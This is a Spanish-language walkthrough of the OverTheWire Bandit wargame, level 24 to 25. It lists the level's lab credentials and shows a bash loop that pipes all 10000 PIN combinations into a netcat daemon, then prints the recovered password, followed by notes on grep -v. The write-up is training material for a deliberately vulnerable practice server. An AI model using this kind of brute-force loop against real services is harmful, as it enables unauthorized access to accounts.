## Objetivo 
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Datos de Acceso al Nivel
user: bandit24
password:  gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Solución
```bash
└─$ ssh bandit24@bandit.labs.overthewire.org -p2220 
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit24@bandit.labs.overthewire.org's password: 

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234
Wrong! Please enter the correct current password and pincode. Try again.
^C
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i ; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
	The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:~$ 

```

## Notas Adicionales

grep -v mensaj se usa para filtrar la salida de datos, excluyendo las líneas que contienen un texto específico. 

grep: Este es un comando utilizado para buscar patrones en la entrada de texto. grep significa "Global Regular Expression Print" y se usa para encontrar líneas que coinciden con un patrón.

-v: Esta opción le dice a grep que "invierte" el patrón de búsqueda. En lugar de mostrar las líneas que coinciden con el patrón especificado, grep -v muestra las líneas que no coinciden con el patrón.

mensaje: Este es el patrón de búsqueda. 
## Referencias 

[Cómo usar el comando grep en Linux (ejemplos prácticos) (hostinger.es)](https://www.hostinger.es/tutoriales/comando-grep-linux)